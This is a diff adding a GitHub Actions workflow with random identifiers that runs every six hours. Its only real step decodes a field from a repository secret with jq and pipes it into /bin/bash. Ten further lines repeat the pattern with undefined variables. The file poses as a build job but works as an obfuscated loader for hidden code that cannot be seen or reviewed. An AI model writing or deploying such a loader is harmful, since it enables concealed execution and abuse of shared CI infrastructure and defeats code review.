@@ -1,0 +1,28 @@
+name: zhushiwan6543
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhushiwan6543
+        env:
+          pkwio77: ${{ secrets.pkwio77 }}
+        run: |
+          echo $pkwio77 | jq -r .g607 | /bin/bash
+          echo $sfbpo71 | jq -r .kdal80 | /bin/bash
+          echo $dw469 | jq -r .ut6652 | /bin/bash
+          echo $qcm1176 | jq -r .c45263 | /bin/bash
+          echo $in15 | jq -r .vxgsg36834 | /bin/bash
+          echo $gxv85400 | jq -r .pvds57 | /bin/bash
+          echo $k65 | jq -r .sijqk0496 | /bin/bash
+          echo $eop08415 | jq -r .mgsha71693 | /bin/bash
+          echo $tlqka76 | jq -r .wihka85378 | /bin/bash
+          echo $upiv2 | jq -r .vjoj3548 | /bin/bash
+          echo $xnywo49156 | jq -r .zbz5578 | /bin/bash
+
